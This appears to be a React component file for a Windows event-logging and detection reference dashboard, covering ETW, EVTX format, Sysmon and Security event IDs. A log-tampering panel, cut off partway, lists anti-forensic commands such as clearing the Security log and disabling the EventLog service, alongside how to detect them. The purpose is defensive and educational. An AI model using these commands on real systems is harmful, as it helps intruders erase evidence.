import { useState } from "react";

const C = {
  bg: "#06070b",
  panel: "#080910",
  header: "#0a0c18",
  border: "#121c2e",
  cyan: "#00a8d8",
  green: "#00d058",
  red: "#ff1030",
  orange: "#ff7800",
  yellow: "#e0a808",
  purple: "#7020d8",
  teal: "#00a890",
  pink: "#d81870",
  lime: "#68b808",
  sky: "#1898e8",
  gold: "#b87008",
  blue: "#1848d8",
  indigo: "#4830b8",
  text: "#90a8bc",
  dim: "#304050",
  bright: "#b8d0e8",
};

const mono = "'JetBrains Mono','Cascadia Code','Fira Code',monospace";

const S = {
  root: { background: C.bg, color: C.text, fontFamily: mono, minHeight: "100vh", fontSize: "12.5px", lineHeight: "1.65" },
  bar: { background: C.header, borderBottom: `1px solid ${C.border}`, padding: "7px 20px", display: "flex", alignItems: "center", gap: "14px", position: "sticky", top: 0, zIndex: 100 },
  dot: c => ({ width: 9, height: 9, borderRadius: "50%", background: c, display: "inline-block" }),
  wrap: { maxWidth: "1220px", margin: "0 auto", padding: "18px 14px", display: "flex", flexDirection: "column", gap: "14px" },
  panel: c => ({ background: C.panel, border: `1px solid ${c || C.border}`, borderRadius: "5px", overflow: "hidden" }),
  ph: c => ({ background: C.header, borderBottom: `1px solid ${c || C.border}`, padding: "9px 15px", display: "flex", alignItems: "center", gap: "9px" }),
  pt: c => ({ color: c || C.cyan, fontWeight: "700", fontSize: "11px", letterSpacing: "1.8px", textTransform: "uppercase" }),
  pb: { padding: "15px" },
  code: { background: "#030408", border: `1px solid ${C.border}`, borderRadius: "4px", padding: "11px 13px", fontFamily: mono, fontSize: "11.5px", overflowX: "auto", whiteSpace: "pre", lineHeight: "1.75" },
  grid2: { display: "grid", gridTemplateColumns: "1fr 1fr", gap: "14px" },
  grid3: { display: "grid", gridTemplateColumns: "1fr 1fr 1fr", gap: "11px" },
  grid4: { display: "grid", gridTemplateColumns: "1fr 1fr 1fr 1fr", gap: "10px" },
  badge: c => ({ background: `${c}1a`, border: `1px solid ${c}55`, color: c, borderRadius: "3px", padding: "2px 7px", fontSize: "10.5px", fontWeight: "700" }),
  tag: c => ({ display: "inline-block", background: `${c}14`, border: `1px solid ${c}40`, color: c, borderRadius: "3px", padding: "1px 6px", fontSize: "10.5px", margin: "2px" }),
  sep: { borderColor: C.border, margin: "11px 0", borderStyle: "dashed", borderWidth: "0 0 1px 0" },
  row: { display: "flex", gap: "9px", marginBottom: "7px", alignItems: "flex-start" },
  bul: c => ({ color: c || C.cyan, minWidth: "13px", fontWeight: "700", marginTop: "1px" }),
  tab: (a, c) => ({ padding: "6px 13px", cursor: "pointer", fontFamily: mono, background: a ? `${c}1a` : "transparent", border: `1px solid ${a ? c : C.border}`, borderRadius: "4px", color: a ? c : C.dim, fontSize: "10.5px", fontWeight: a ? "700" : "400", letterSpacing: "0.5px", transition: "all 0.15s" }),
};

const PB = ({ title, icon, color, accent, children }) => (
  <div style={S.panel(accent || color || C.border)}>
    <div style={S.ph(accent || color || C.border)}>
      <span>{icon}</span><span style={S.pt(color || C.cyan)}>{title}</span>
    </div>
    <div style={S.pb}>{children}</div>
  </div>
);
const Pill = ({ c, children }) => <span style={S.badge(c || C.cyan)}>{children}</span>;
const Tag  = ({ c, children }) => <span style={S.tag(c || C.cyan)}>{children}</span>;
const Row  = ({ c, b, children }) => (
  <div style={S.row}><span style={S.bul(c)}>{b || "▸"}</span><span style={{ color: C.text }}>{children}</span></div>
);
const KV = ({ k, v, kc }) => (
  <div style={{ display: "flex", gap: "8px", marginBottom: "5px" }}>
    <span style={{ color: kc || C.teal, minWidth: "195px", fontWeight: "600" }}>{k}</span>
    <span style={{ color: C.dim }}>:</span><span style={{ color: C.bright }}>{v}</span>
  </div>
);

/* ── Event Log Architecture SVG ─────────────────────────────────────────── */
const EventLogArch = () => (
  <svg viewBox="0 0 760 520" style={{ width: "100%", maxWidth: "760px", display: "block", margin: "0 auto" }}>
    <text x="380" y="14" textAnchor="middle" fill="#304050" fontSize="10" letterSpacing="2">WINDOWS EVENT LOG ARCHITECTURE — EVENT SOURCE TO STORAGE</text>

    {/* Event Sources */}
    <rect x="10" y="22" width="740" height="68" rx="4" fill="#080910" stroke="#00d05822" strokeWidth="1" />
    <text x="380" y="40" textAnchor="middle" fill="#00d058" fontSize="10" fontWeight="700" letterSpacing="1.5">EVENT SOURCES — Who generates events</text>
    {[
      ["Windows Kernel\n(ntoskrnl.exe)", C.cyan, 20],
      ["Security Audit\n(LSA / SRM)", C.red, 165],
      ["Applications\n(ETW providers)", C.purple, 310],
      ["Sysmon\n(System Monitor)", C.orange, 455],
      ["PowerShell\n(PS engine ETW)", C.yellow, 600],
    ].map(([l, c, x]) => (
      <g key={l}>
        <rect x={x} y={48} width="128" height="34" rx="2" fill={`${c}0c`} stroke={`${c}44`} strokeWidth="1.5" />
        <text x={x+64} y={62} textAnchor="middle" fill={c} fontSize="9" fontWeight="700">{l.split("\n")[0]}</text>
        <text x={x+64} y={76} textAnchor="middle" fill="#304050" fontSize="8.5">{l.split("\n")[1]}</text>
      </g>
    ))}

    {/* ETW Layer */}
    <rect x="10" y="100" width="740" height="56" rx="4" fill="#080810" stroke="#7020d855" strokeWidth="2" />
    <text x="380" y="120" textAnchor="middle" fill="#7020d8" fontSize="11" fontWeight="800">ETW — Event Tracing for Windows (ntoskrnl + sechost.dll)</text>
    <text x="380" y="136" textAnchor="middle" fill="#304050" fontSize="9">Provider registration → ETW kernel session → Consumer subscription → Ring buffer → Delivery to consumers</text>
    <text x="380" y="150" textAnchor="middle" fill="#304050" fontSize="8.5">System sessions: NT Kernel Logger · Circular Kernel Context Logger · EventLog-Security · DiagLog · SysmonDrv</text>

    {/* Event Log Service */}
    <rect x="200" y="166" width="360" height="44" rx="4" fill="#0a0810" stroke="#00a8d855" strokeWidth="2" />
    <text x="380" y="184" textAnchor="middle" fill="#00a8d8" fontSize="11" fontWeight="700">Windows Event Log Service (wevtsvc / svchost)</text>
    <text x="380" y="200" textAnchor="middle" fill="#304050" fontSize="9">Subscribes to ETW sessions · Routes events to channels · Manages EVTX files · Access control per channel</text>

    {/* Channels */}
    <text x="380" y="226" textAnchor="middle" fill="#304050" fontSize="9" letterSpacing="1">LOG CHANNELS (stored as .evtx files in C:\Windows\System32\winevt\Logs\)</text>
    {[
      { name: "Security", file: "Security.evtx", color: C.red, x: 10, events: "4624,4625,4688,4698,4662..." },
      { name: "System", file: "System.evtx", color: C.orange, x: 200, events: "7045,7034,6005,6008..." },
      { name: "Application", file: "Application.evtx", color: C.yellow, x: 390, events: "App-specific events" },
      { name: "Sysmon", file: "Microsoft-Windows-Sysmon%4Operational.evtx", color: C.cyan, x: 580, events: "1-29 process/net/file..." },
    ].map(({ name, file, color, x, events }) => (
      <g key={name}>
        <rect x={x} y={234} width="172" height="70" rx="3" fill={`${color}0c`} stroke={`${color}44`} strokeWidth="1.5" />
        <text x={x+86} y={252} textAnchor="middle" fill={color} fontSize="11" fontWeight="700">{name}</text>
        <text x={x+86} y={267} textAnchor="middle" fill="#304050" fontSize="8">{file.slice(0,22)}</text>
        <text x={x+86} y={282} textAnchor="middle" fill="#304050" fontSize="8">{events}</text>
        <text x={x+86} y={297} textAnchor="middle" fill={color} fontSize="8" fontWeight="700">.evtx</text>
      </g>
    ))}

    {/* More channels */}
    {[
      ["PowerShell/Operational", C.purple, 10, "4100,4103,4104 script block..."],
      ["TaskScheduler/Operational", C.teal, 200, "106,141,200,201 task events"],
      ["WMI-Activity/Operational", C.pink, 390, "5858,5861 WMI events"],
      ["DNS Client/Operational", C.sky, 580, "3006,3008 DNS queries"],
    ].map(([name, c, x, events]) => (
      <g key={name}>
        <rect x={x} y={316} width="172" height="56" rx="3" fill={`${c}0c`} stroke={`${c}33`} strokeWidth="1" />
        <text x={x+86} y={334} textAnchor="middle" fill={c} fontSize="9.5" fontWeight="700">{name.split("/")[0]}</text>
        <text x={x+86} y={348} textAnchor="middle" fill="#304050" fontSize="8">{events.slice(0,28)}</text>
        <text x={x+86} y={362} textAnchor="middle" fill={c} fontSize="8">{name.split("/")[1]}</text>
      </g>
    ))}

    {/* EVTX Binary format */}
    <rect x="10" y="384" width="740" height="56" rx="3" fill="#07080c" stroke="#30405055" strokeWidth="1" />
    <text x="380" y="402" textAnchor="middle" fill="#304050" fontSize="10" fontWeight="700">EVTX BINARY FORMAT — ELF_LOG_HEADER + ELF_CHUNK_HEADER + EVENT_RECORD</text>
    {["Magic: ElfFile\\0","Chunk size: 65536B","Event records","Checksums (CRC32)","First event LSN","Last event LSN"].map((f, i) => (
      <text key={f} x={20 + i * 123} y={430} fill="#304050" fontSize="8.5" fontWeight="700">{f}</text>
    ))}

    {/* Consumers */}
    <rect x="10" y="452" width="740" height="60" rx="4" fill="#07080c" stroke="#00a85555" strokeWidth="1" />
    <text x="20" y="470" fill="#00a855" fontSize="10" fontWeight="700">CONSUMERS — Who reads events</text>
    {["Event Viewer\n(eventvwr.msc)","wevtutil.exe\n(CLI query)","Get-WinEvent\n(PowerShell)","Windows Event\nForwarding (WEF)","SIEM Agents\n(Splunk/Elastic)"].map(([l], i) => (
      <text key={l} x={30 + i * 148} y={495} fill="#304050" fontSize="9">{l}</text>
    ))}
    {[["Event Viewer\n(eventvwr.msc)", C.cyan, 15],["wevtutil.exe\n(CLI query)", C.teal, 160],["Get-WinEvent\n(PowerShell)", C.green, 305],["Windows Event\nForwarding (WEF)", C.orange, 450],["SIEM Agents\n(Splunk/Elastic)", C.purple, 595]].map(([l, c, x]) => (
      <g key={l}>
        <rect x={x} y={460} width="140" height="44" rx="2" fill={`${c}0c`} stroke={`${c}33`} strokeWidth="1" />
        <text x={x+70} y={477} textAnchor="middle" fill={c} fontSize="9.5" fontWeight="700">{l.split("\n")[0]}</text>
        <text x={x+70} y={491} textAnchor="middle" fill="#304050" fontSize="8.5">{l.split("\n")[1]}</text>
      </g>
    ))}
  </svg>
);

/* ── ETW Architecture ───────────────────────────────────────────────────── */
const ETWArch = () => (
  <svg viewBox="0 0 760 400" style={{ width: "100%", maxWidth: "760px", display: "block", margin: "0 auto" }}>
    <text x="380" y="14" textAnchor="middle" fill="#304050" fontSize="10" letterSpacing="2">ETW — EVENT TRACING FOR WINDOWS (KERNEL TELEMETRY BACKBONE)</text>

    {/* Providers */}
    <rect x="10" y="22" width="220" height="360" rx="4" fill="#07080c" stroke="#7020d833" strokeWidth="1.5" />
    <text x="120" y="40" textAnchor="middle" fill="#7020d8" fontSize="10" fontWeight="700">ETW PROVIDERS</text>
    {[
      ["Microsoft-Windows-Kernel-Process", C.cyan, "Process/thread create"],
      ["Microsoft-Windows-Security-Auditing", C.red, "Security events → Security.evtx"],
      ["Microsoft-Windows-Sysmon", C.orange, "Sysmon all events"],
      ["Microsoft-Windows-PowerShell", C.yellow, "4103/4104 script logs"],
      ["Microsoft-Windows-DNS-Client", C.teal, "DNS resolution events"],
      ["Microsoft-Antimalware-Engine", C.pink, "Defender detections"],
      ["Microsoft-Windows-TCPIP", C.sky, "Network TCP/IP events"],
      ["Microsoft-Windows-WMI-Activity", C.purple, "WMI event activity"],
      ["Custom App Providers", C.dim, "Register via EventSource/.NET"],
    ].map(([name, c, desc], i) => (
      <g key={name}>
        <rect x="18" y={48 + i * 37} width="204" height="30" rx="2" fill={`${c}0c`} stroke={`${c}33`} strokeWidth="1" />
        <text x="120" y={61 + i * 37} textAnchor="middle" fill={c} fontSize="8.5" fontWeight="700">{name.length > 30 ? name.slice(0, 30) + "…" : name}</text>
        <text x="120" y={73 + i * 37} textAnchor="middle" fill="#304050" fontSize="7.5">{desc}</text>
      </g>
    ))}

    {/* ETW Kernel */}
    <rect x="250" y="120" width="260" height="170" rx="4" fill="#0a0810" stroke="#7020d855" strokeWidth="2" />
    <text x="380" y="140" textAnchor="middle" fill="#7020d8" fontSize="11" fontWeight="800">ETW KERNEL ENGINE</text>
    {[
      ["Session Manager", "#304050", "Manages up to 64 realtime sessions"],
      ["Ring Buffer", "#7020d8", "Per-session circular buffer (default 1MB)"],
      ["Provider Registry", "#304050", "GUID → provider DLL mapping"],
      ["Keyword/Level Filter", "#304050", "64-bit keyword mask, verbosity level"],
      ["Event Multiplexer", "#7020d8", "Fan-out: one event → N sessions"],
    ].map(([label, c, desc], i) => (
      <g key={label}>
        <rect x="258" y={154 + i * 26} width="244" height="22" rx="2" fill={`${c}0a`} stroke={`${c}22`} strokeWidth="1" />
        <text x="380" y={168 + i * 26} textAnchor="middle" fill={c} fontSize="9" fontWeight="700">{label}</text>
      </g>
    ))}

    {/* Sessions */}
    <rect x="530" y="22" width="220" height="360" rx="4" fill="#07080c" stroke="#00a8d833" strokeWidth="1.5" />
    <text x="640" y="40" textAnchor="middle" fill="#00a8d8" fontSize="10" fontWeight="700">ETW SESSIONS</text>
    {[
      ["NT Kernel Logger", C.cyan, "Built-in; process/thread/network/disk I/O"],
      ["EventLog-Security", C.red, "Security audit events → Security.evtx"],
      ["Sysmon Session", C.orange, "SysmonDrv kernel callbacks → Sysmon log"],
      ["WinDiag Session", C.dim, "Diagnostics, WER, reliability"],
      ["Realtime Consumer", C.green, "Live: logman / xperf / tracelog"],
      ["File-Mode Session", C.yellow, ".etl file output for offline analysis"],
      ["Circular Session", C.teal, "Fixed-size file, oldest overwritten"],
      ["Private Session", C.purple, "In-process only (single app)"],
    ].map(([name, c, desc], i) => (
      <g key={name}>
        <rect x="538" y={48 + i * 40} width="204" height="34" rx="2" fill={`${c}0c`} stroke={`${c}33`} strokeWidth="1" />
        <text x="640" y={62 + i * 40} textAnchor="middle" fill={c} fontSize="9" fontWeight="700">{name}</text>
        <text x="640" y={76 + i * 40} textAnchor="middle" fill="#304050" fontSize="8">{desc}</text>
      </g>
    ))}

    {/* Arrows */}
    <line x1="228" y1="200" x2="250" y2="200" stroke="#7020d844" strokeWidth="1.5" />
    <line x1="510" y1="200" x2="530" y2="200" stroke="#7020d844" strokeWidth="1.5" />
    <text x="238" y="196" fill="#304050" fontSize="8">→</text>
    <text x="518" y="196" fill="#304050" fontSize="8">→</text>

    <text x="380" y="392" textAnchor="middle" fill="#304050" fontSize="8.5">logman start MySession -p {"{"}GUID{"}"} 0xFF 0x4 -o trace.etl  |  xperf -on Latency  |  tracerpt trace.etl -o report.xml</text>
  </svg>
);

/* ── WEF Architecture ───────────────────────────────────────────────────── */
const WEFArch = () => (
  <svg viewBox="0 0 760 360" style={{ width: "100%", maxWidth: "760px", display: "block", margin: "0 auto" }}>
    <text x="380" y="14" textAnchor="middle" fill="#304050" fontSize="10" letterSpacing="2">WINDOWS EVENT FORWARDING (WEF) — ENTERPRISE LOG COLLECTION</text>

    {/* Source computers */}
    <rect x="10" y="22" width="200" height="300" rx="4" fill="#07080c" stroke="#00a8d833" strokeWidth="1.5" />
    <text x="110" y="40" textAnchor="middle" fill="#00a8d8" fontSize="10" fontWeight="700">SOURCE COMPUTERS</text>
    <text x="110" y="54" textAnchor="middle" fill="#304050" fontSize="8.5">(Event Sources)</text>
    {["WKSTN-001..100","SRV-SQL01..20","SRV-IIS01..10","DC01, DC02","All endpoints"].map((name, i) => (
      <g key={name}>
        <rect x="18" y={64 + i * 46} width="184" height="38" rx="3" fill="#00a8d80c" stroke="#00a8d833" strokeWidth="1" />
        <text x="110" y={80 + i * 46} textAnchor="middle" fill="#00a8d8" fontSize="9.5" fontWeight="700">{name}</text>
        <text x="110" y={94 + i * 46} textAnchor="middle" fill="#304050" fontSize="8">{["Windows Remote Mgmt","WinRM (5985/5986)","Kerberos auth","Local event stores","Subscribed channels"][i]}</text>
      </g>
    ))}

    {/* Transport */}
    <rect x="220" y="140" width="120" height="80" rx="3" fill="#0a0810" stroke="#7020d844" strokeWidth="1.5" />
    <text x="280" y="165" textAnchor="middle" fill="#7020d8" fontSize="10" fontWeight="700">WS-MAN</text>
    <text x="280" y="180" textAnchor="middle" fill="#304050" fontSize="8.5">HTTP(S) 5985/5986</text>
    <text x="280" y="194" textAnchor="middle" fill="#304050" fontSize="8.5">Kerberos Auth</text>
    <text x="280" y="208" textAnchor="middle" fill="#304050" fontSize="8.5">Encrypted channel</text>

    {/* WEC Server */}
    <rect x="360" y="22" width="200" height="300" rx="4" fill="#07080c" stroke="#e0a80855" strokeWidth="2" />
    <text x="460" y="40" textAnchor="middle" fill="#e0a808" fontSize="10" fontWeight="700">WEC SERVER</text>
    <text x="460" y="54" textAnchor="middle" fill="#304050" fontSize="8.5">(Windows Event Collector)</text>

    {[
      { label: "Subscription Manager", color: C.yellow, desc: "Subscription XML defines:\n• Source computers (GPO)\n• Event query (XPath/WECUTIL)\n• Delivery mode (Push/Pull)\n• Log channel destination" },
      { label: "Wecsvc (Collector Svc)", color: C.orange, desc: "Windows Event Collector service\nReceives forwarded events\nManages connections per source\nDe-duplication via bookmark" },
      { label: "ForwardedEvents Channel", color: C.cyan, desc: "Dedicated .evtx on WEC server\nEvents from ALL sources stored here\nOr: route to custom channels per type" },
    ].map(({ label, color, desc }, i) => (
      <g key={label}>
        <rect x="368" y={66 + i * 82} width="184" height="76" rx="3" fill={`${color}0c`} stroke={`${color}44`} strokeWidth="1.5" />
        <text x="460" y={84 + i * 82} textAnchor="middle" fill={color} fontSize="10" fontWeight="700">{label}</text>
        {desc.split("\n").map((d, j) => (
          <text key={d} x="460" y={100 + i * 82 + j * 13} textAnchor="middle" fill="#304050" fontSize="8.5">{d}</text>
        ))}
      </g>
    ))}

    {/* SIEM */}
    <rect x="580" y="90" width="170" height="160" rx="4" fill="#07080c" stroke="#00a89055" strokeWidth="1.5" />
    <text x="665" y="110" textAnchor="middle" fill="#00a890" fontSize="10" fontWeight="700">SIEM / SOC</text>
    {[["Splunk", C.cyan],["Elastic Stack", C.yellow],["Microsoft Sentinel", C.sky],["IBM QRadar", C.purple],["Wazuh (SIEM)", C.green]].map(([name, c], i) => (
      <g key={name}>
        <rect x="588" y={120 + i * 24} width="154" height="18" rx="2" fill={`${c}0c`} stroke={`${c}33`} strokeWidth="1" />
        <text x="665" y={133 + i * 24} textAnchor="middle" fill={c} fontSize="9">{name}</text>
      </g>
    ))}

    {/* Arrows */}
    <line x1="210" y1="180" x2="220" y2="180" stroke="#00a8d844" strokeWidth="1.5" />
    <line x1="340" y1="180" x2="360" y2="180" stroke="#7020d844" strokeWidth="1.5" />
    <line x1="560" y1="180" x2="580" y2="180" stroke="#00a89044" strokeWidth="1.5" />
    <text x="228" y="176" fill="#00a8d8" fontSize="8">→</text>
    <text x="348" y="176" fill="#7020d8" fontSize="8">→</text>
    <text x="568" y="176" fill="#00a890" fontSize="8">→</text>

    {/* GPO note */}
    <rect x="10" y="336" width="740" height="20" rx="3" fill="#07080c" stroke="#30405044" strokeWidth="1" />
    <text x="380" y="350" textAnchor="middle" fill="#304050" fontSize="8.5">GPO deploys WEF subscription to all source machines: Computer Config → Windows Settings → Event Forwarding → Configure target subscription manager = Server=http://WEC:5985/wsman/SubscriptionManager/WEC</text>
  </svg>
);

/* ── EVTX Binary Format ─────────────────────────────────────────────────── */
const EVTXFormat = () => (
  <div>
    <div style={S.grid2}>
      <div>
        <div style={{ color: C.gold, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ EVTX BINARY FORMAT — ON DISK STRUCTURE</div>
        <div style={S.code}>
{`EVTX File Header (4096 bytes):`}
{`  Signature      : "ElfFile\\0" (8 bytes)`}
{`  OldestChunk    : UINT64 — oldest chunk offset`}
{`  CurrentChunkNum: UINT64 — current write chunk`}
{`  NextRecord     : UINT64 — next record number`}
{`  HeaderBlockSize: UINT32 — 128 bytes`}
{`  Flags          : UINT32 — DIRTY bit (0x1)`}
{`  Checksum       : UINT32 — CRC32 of header`}
{``}
{`EVTX Chunk Header (512 bytes per 65536B chunk):`}
{`  Signature      : "ElfChnk\\0"`}
{`  FirstEventRecNum: UINT64`}
{`  LastEventRecNum : UINT64`}
{`  FirstEventOffset: UINT32`}
{`  LastEventOffset : UINT32`}
{`  EventRecordCount: UINT32`}
{`  StringTable     : offset to string table`}
{`  TemplateTable   : offset to template table`}
{`  HeaderChecksum  : CRC32 (first 120 bytes)`}
{`  EventsChecksum  : CRC32 (all event records)`}
{``}
{`EVENT_RECORD:`}
{`  Signature      : 0x2a2a (** magic)`}
{`  Length         : UINT32 — total record size`}
{`  Written        : FILETIME — record write time`}
{`  EventRecordID  : UINT64 — monotonic ID`}
{`  BinXML         : variable — event data as BinXML`}
{`  Length2        : UINT32 — copy of Length`}
        </div>
      </div>
      <div>
        <div style={{ color: C.teal, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ EVTX FORENSIC SIGNIFICANCE</div>
        {[
          ["Record ID gaps", "EventRecordID is monotonically increasing. Gaps in the sequence = records were deleted. Normal roll-over shows consistent sequence. 1000 records with IDs jumping 1→500→1000 = deletion.", C.red],
          ["DIRTY flag forensics", "Header DIRTY bit set when EVTX is open. If flag set on a closed file = improper shutdown or tampering. wevtutil cl clears the dirty flag AND deletes records.", C.orange],
          ["Chunk checksum validation", "EventsChecksum covers all event data in chunk. Tampering any event byte invalidates checksum. Parse with python-evtx library to detect checksum failures.", C.yellow],
          ["Time synchronisation", "Written timestamp in EVENT_RECORD is the EventLog service write time. TimeCreated in the event XML is the source timestamp. Mismatch can indicate event injection.", C.teal],
          ["Slack space forensics", "Deleted records may persist in chunk slack space. python-evtx can recover deleted records before they're overwritten by new events.", C.cyan],
        ].map(([t, d, c]) => (
          <div key={t} style={{ background: "#080910", border: `1px solid ${c}22`, borderRadius: "4px", padding: "9px", marginBottom: "7px" }}>
            <div style={{ color: c, fontSize: "11px", fontWeight: "700", marginBottom: "3px" }}>▸ {t}</div>
            <div style={{ color: C.dim, fontSize: "10.5px" }}>{d}</div>
          </div>
        ))}
      </div>
    </div>
  </div>
);

/* ── Sysmon Event Reference ─────────────────────────────────────────────── */
const SysmonRef = () => {
  const events = [
    [1,  "Process Create", C.red,    "Full cmdline, hash, PPID, user, integrity level. THE foundational detection event."],
    [2,  "File Creation Time Changed", C.orange, "Timestomping detection. New vs previous creation time."],
    [3,  "Network Connection", C.cyan,"Source/dest IP:port, process, protocol. Detect C2 beacons."],
    [4,  "Sysmon Service State", C.dim,"Sysmon started/stopped. Alert on unexpected stops."],
    [5,  "Process Terminated", C.dim, "PID, process name, exit code. Pair with Event 1."],
    [6,  "Driver Loaded", C.red,      "Path, hash, signature. BYOVD detection."],
    [7,  "Image Loaded", C.orange,    "DLL load: path, hash, signed. Detect DLL hijacking."],
    [8,  "CreateRemoteThread", C.red, "Source→target PID, start address. Injection detector."],
    [9,  "RawAccessRead", C.orange,   "Raw disk read (\\Device\\HarddiskVolume). Detect LSASS scraping."],
    [10, "ProcessAccess", C.red,      "OpenProcess. LSASS access detection (0x10 PROCESS_VM_READ)."],
    [11, "FileCreate", C.yellow,      "File created: path, hash. Payload drops."],
    [12, "RegistryEvent (Object)", C.teal,"Registry key/value create/delete."],
    [13, "RegistryEvent (Value Set)", C.orange,"Registry value written. Run key persistence."],
    [14, "RegistryEvent (Rename)", C.dim,"Registry key/value renamed."],
    [15, "FileCreateStreamHash", C.red,"ADS creation! Name + hash. Zone.Identifier removal."],
    [16, "Sysmon Config Changed", C.dim,"Config reload. Alert on unexpected changes."],
    [17, "PipeEvent (Created)", C.purple,"Named pipe create. C2/lateral movement."],
    [18, "PipeEvent (Connected)", C.purple,"Named pipe connected. PrintSpoofer detection."],
    [19, "WmiEvent (Filter)", C.red,   "WMI EventFilter created. Persistence!"],
    [20, "WmiEvent (Consumer)", C.red, "WMI EventConsumer created. Persistence!"],
    [21, "WmiEvent (Binding)", C.red,  "WMI FilterToConsumer bound. Subscription live!"],
    [22, "DNS Query", C.teal,          "DNS query + response. Detect tunneling + C2 domains."],
    [23, "FileDelete", C.orange,       "File deleted with hash. Evidence of cleanup."],
    [24, "Clipboard Change", C.dim,    "Clipboard content change (if enabled in config)."],
    [25, "ProcessTampering", C.red,    "Process hollowing / herpaderping detected!"],
    [26, "FileDeleteDetected", C.dim,  "File delete logged even if archive disabled."],
  ];
  return (
    <div>
      <div style={{ display: "grid", gridTemplateColumns: "40px 200px 70px 1fr", gap: "1px", background: C.border, borderRadius: "4px 4px 0 0", overflow: "hidden" }}>
        {["ID","EVENT NAME","PRIORITY","DESCRIPTION + DETECTION USE CASE"].map(h => (
          <div key={h} style={{ background: C.header, padding: "6px 8px" }}>
            <span style={{ color: C.dim, fontWeight: "700", fontSize: "10px" }}>{h}</span>
          </div>
        ))}
      </div>
      <div style={{ border: `1px solid ${C.border}`, borderTop: "none", borderRadius: "0 0 4px 4px", overflow: "hidden" }}>
        {events.map(([id, name, c, desc], i) => (
          <div key={id} style={{ display: "grid", gridTemplateColumns: "40px 200px 70px 1fr", gap: "1px", background: i % 2 === 0 ? "#070809" : C.panel, borderTop: i > 0 ? `1px solid ${C.border}` : "none" }}>
            <div style={{ padding: "5px 8px" }}><span style={{ color: c, fontWeight: "700", fontSize: "11px" }}>{id}</span></div>
            <div style={{ padding: "5px 8px" }}><span style={{ color: c, fontSize: "10.5px", fontWeight: "600" }}>{name}</span></div>
            <div style={{ padding: "5px 8px" }}><span style={S.badge(c)}>{[1,6,8,10,15,19,20,21,25].includes(id) ? "CRITICAL" : [2,3,7,9,11,13,17,18,22,23].includes(id) ? "HIGH" : "MED"}</span></div>
            <div style={{ padding: "5px 8px" }}><span style={{ color: C.dim, fontSize: "10.5px" }}>{desc}</span></div>
          </div>
        ))}
      </div>
    </div>
  );
};

/* ── Key Event ID Reference ─────────────────────────────────────────────── */
const EventIDRef = () => {
  const categories = [
    { cat: "Account Logon & Auth", color: C.cyan, events: [
      ["4624","Successful logon — Type 3 (net), 10 (RDP), 9 (NewCred/PtH)"],
      ["4625","Failed logon — brute force indicator. Status code reveals reason."],
      ["4648","Explicit credential use (RunAs, WMI with creds)"],
      ["4768","Kerberos AS-REQ — TGT request. PreAuth=0 = AS-REP Roastable."],
      ["4769","Kerberos TGS-REQ — Ticket request. RC4(0x17) = Kerberoasting."],
      ["4776","NTLM validation — on DC for domain auth. Source workstation logged."],
    ]},
    { cat: "Process & Object", color: C.orange, events: [
      ["4688","Process created — includes cmdline if audit enabled. Parent PID."],
      ["4689","Process terminated — pair with 4688 for duration."],
      ["4656","Object handle requested — file/reg key open attempt."],
      ["4663","Object access — file/reg key read/write/delete."],
      ["4670","Object permissions changed — DACL modification."],
    ]},
    { cat: "Privilege & Policy", color: C.red, events: [
      ["4672","Special privileges at logon — SeDebug, SeImpersonate, SeTcb."],
      ["4673","Privileged service called — SeBackup, SeRestore, SeDebug."],
      ["4697","Service installed (Security log equivalent of 7045)."],
      ["4698","Scheduled task created — remote creation = lateral movement."],
      ["4702","Scheduled task updated — payload swap indicator."],
    ]},
    { cat: "AD / Directory", color: C.purple, events: [
      ["4662","AD object operation — DCSync GUID check on domain partition."],
      ["4720","User account created."],
      ["4732","Member added to security group — alert on Admins groups."],
      ["5136","AD object modified — attribute change. AdminSDHolder, msDS-*."],
      ["5137","AD object created — new GPO, computer account, user."],
    ]},
    { cat: "System & Service", color: C.yellow, events: [
      ["7045","New service installed — PsExec/malware service creation (System log)."],
      ["7034","Service crashed — check for FailureActions re-exec."],
      ["7036","Service state changed — filter for critical services only."],
      ["6005","Event log service started — system startup."],
      ["6006","Event log service stopped — shutdown."],
      ["1102","Security audit log cleared — CRITICAL alert. Cover tracks."],
      ["104", "System log cleared — same as 1102 but System log."],
    ]},
    { cat: "Firewall & Network", color: C.teal, events: [
      ["5156","WFP allowed connection — app + src/dst IP:port. High volume."],
      ["5157","WFP blocked connection — every blocked packet logged."],
      ["5140","Network share accessed — ADMIN$ access = lateral movement."],
      ["5145","Network share object access — granular per-file events."],
    ]},
  ];
  return (
    <div style={S.grid2}>
      {categories.map(({ cat, color, events }) => (
        <div key={cat} style={{ background: "#07080c", border: `1px solid ${color}22`, borderRadius: "4px", overflow: "hidden" }}>
          <div style={{ background: C.header, padding: "7px 10px", borderBottom: `1px solid ${color}33` }}>
            <span style={{ color, fontWeight: "700", fontSize: "11px" }}>▸ {cat}</span>
          </div>
          <div style={{ padding: "8px" }}>
            {events.map(([id, desc]) => (
              <div key={id} style={{ display: "flex", gap: "8px", marginBottom: "5px", alignItems: "flex-start" }}>
                <span style={{ ...S.badge(color), minWidth: "38px", textAlign: "center", flexShrink: 0 }}>{id}</span>
                <span style={{ color: C.dim, fontSize: "10.5px" }}>{desc}</span>
              </div>
            ))}
          </div>
        </div>
      ))}
    </div>
  );
};

/* ── Log Tampering Detection ─────────────────────────────────────────────── */
const TamperDetection = () => (
  <div>
    <div style={S.grid2}>
      <div>
        <div style={{ color: C.red, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ LOG TAMPERING TECHNIQUES & INDICATORS</div>
        {[
          ["wevtutil cl Security", "Clear specific log channel. Event 1102 (Security) or 104 (System) logged in that channel before clearing — if attacker clears after 1102 appears, you still have the clear event.", C.red],
          ["Delete EVTX file directly", "Stop Event Log service → delete .evtx → restart. Event 1100 (log service stop) logged before. Service stop is suspicious outside maintenance.", C.orange],
          ["Event record injection", "Forge events with fake timestamps to confuse timeline. Detectable: EventRecordID out of sequence, Written vs TimeCreated mismatch, chunk checksum failure.", C.yellow],
          ["EventLog service disable", "Set-Service EventLog -StartupType Disabled. Alert on service state change for EventLog. ETW sessions continue independently — Sysmon ring buffer may survive.", C.orange],
          ["Minimum log size (overflow)", "Reduce log max size so events roll over quickly. Check max size vs retention policy: wevtutil gl Security → maxSize. Attacker shrinks to 1MB to lose old events.", C.yellow],
        ].map(([t, d, c]) => (
          <div key={t} style={{ background: "#100808", border: `1px solid ${c}33`, borderRadius: "4px", padding: "9px", marginBottom: "7px" }}>
